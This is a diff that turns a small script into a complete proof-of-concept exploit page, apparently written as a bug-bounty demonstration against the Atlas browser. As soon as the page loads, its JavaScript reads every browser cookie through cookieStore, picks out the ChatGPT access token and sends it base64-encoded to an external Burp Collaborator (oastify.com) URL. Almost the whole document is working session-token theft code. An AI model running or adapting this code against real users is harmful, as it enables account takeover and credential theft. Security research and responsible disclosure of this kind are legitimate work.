@@ -1,11 +1,61 @@
-<script>
-async function exploit() {
-    const cookies = await cookieStore.getAll();
-    const token = cookies.find(c => c.name.includes('access-token'));
-    if (token) {
-        document.body.innerHTML = "<h1>EXPLOIT SUCCESSFUL</h1><p>Stolen Token Found: " + token.value.substring(0, 15) + "...</p>";
-        // In a real attack, you would fetch() this to your server here
-    }
-}
-exploit();
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Research - Atlas Audit</title>
+    <style>
+        body { font-family: sans-serif; background-color: #1a1a1a; color: #00ff00; padding: 50px; }
+        .success { border: 2px solid #00ff00; padding: 20px; display: none; }
+        .loading { color: #888; }
+    </style>
+</head>
+<body>
+    <h1>Atlas Browser - Security Audit Page</h1>
+    <div id="status" class="loading">Status: Probing for CookieStore access...</div>
+    
+    <div id="exploit-box" class="success">
+        <h2>[!] EXPLOIT SUCCESSFUL</h2>
+        <p><strong>Target:</strong> OpenAI Session Token</p>
+        <p><strong>Status:</strong> Stolen & Exfiltrated to Burp Collaborator</p>
+        <p id="token-preview"></p>
+    </div>
+
+    <script>
+        async function runExploit() {
+            const status = document.getElementById('status');
+            const exploitBox = document.getElementById('exploit-box');
+            const preview = document.getElementById('token-preview');
+
+            try {
+                // 1. Trigger the Global Cookie Leak
+                const cookies = await cookieStore.getAll();
+                
+                // 2. Locate the highly sensitive OpenAI Access Token
+                const token = cookies.find(c => c.name.includes('access-token'));
+
+                if (token) {
+                    // 3. Exfiltrate to Burp Collaborator
+                    // We use btoa (Base64) to ensure the token doesn't break the URL
+                    const collabUrl = "https://rmhhtl6d27f1ej138kprj0jxuo0fo5cu.oastify.com/exfil?data=" + btoa(token.value);
+                    
+                    fetch(collabUrl, { mode: 'no-cors' });
+
+                    // 4. Update UI for the PoC Video
+                    status.style.display = 'none';
+                    exploitBox.style.display = 'block';
+                    preview.innerText = "Token Preview: " + token.value.substring(0, 20) + "... [REDACTED]";
+                    
+                    console.log("[+] P1 Exploit Confirmed. Data sent to Burp.");
+                } else {
+                    status.innerText = "[-] CookieStore accessible, but target token not found. Are you logged into ChatGPT?";
+                }
+            } catch (err) {
+                status.innerText = "[-] Exploit Failed: " + err.message;
+                status.style.color = "red";
+            }
+        }
+
+        // Run as soon as the page loads
+        runExploit();
+    </script>
+</body>
+</html>
